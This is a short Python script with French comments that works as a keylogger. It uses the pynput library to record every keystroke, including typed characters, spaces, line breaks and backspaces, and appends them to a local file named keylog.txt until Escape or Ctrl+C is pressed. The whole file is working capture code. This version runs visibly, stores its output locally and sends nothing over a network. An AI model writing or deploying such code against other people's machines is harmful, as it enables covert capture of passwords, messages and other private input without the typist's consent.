import os
from pynput.keyboard import Listener, Key

# Fichier de sortie dans le dossier courant
path = os.path.join(os.getcwd(), "keylog.txt")

log = ""

def processkeys(key):
    global log
    try:
        # Touche "normale" (lettre, chiffre, etc.)
        log += key.char
    except AttributeError:
        # Touches spéciales
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        elif key == Key.tab:
            log += "\t"
        elif key == Key.backspace:
            log = log[:-1]
        elif key == Key.esc:
            print("\nTouche Échap pressée. Arrêt du programme.")
            report()  # Sauvegarde finale avant l'arrêt
            # IMPORTANT : retourner False pour arrêter le listener
            return False
        elif key in (
            Key.up, Key.down, Key.left, Key.right,
            Key.shift, Key.ctrl, Key.alt, Key.cmd, Key.caps_lock
        ):
            # On ignore ces touches
            pass
        else:
            # Autres touches spéciales ignorées
            pass

def report():
    """Écrit le contenu de log dans le fichier et réinitialise log."""
    global log, path
    if not log:  # Rien à écrire
        return
    try:
        with open(path, "a", encoding="utf-8") as logfile:
            logfile.write(log)
        # On vide le buffer après écriture
        log = ""
    except Exception as e:
        print(f"\nErreur lors de l'écriture du fichier log: {e}")

print("Programme lancé. (Esc pour arrêter, Ctrl+C possible)")

try:
    with Listener(on_press=processkeys) as keyboard_listener:
        keyboard_listener.join()

except KeyboardInterrupt:
    # Ici on arrive si quelqu'un fait Ctrl+C dans le terminal
    print("\nProgramme interrompu par Ctrl+C.")

finally:
    # Cette partie est appelée QUOI QU'IL ARRIVE
    print("\nSauvegarde finale avant fermeture...")
    report()
    print("Fin du programme.")
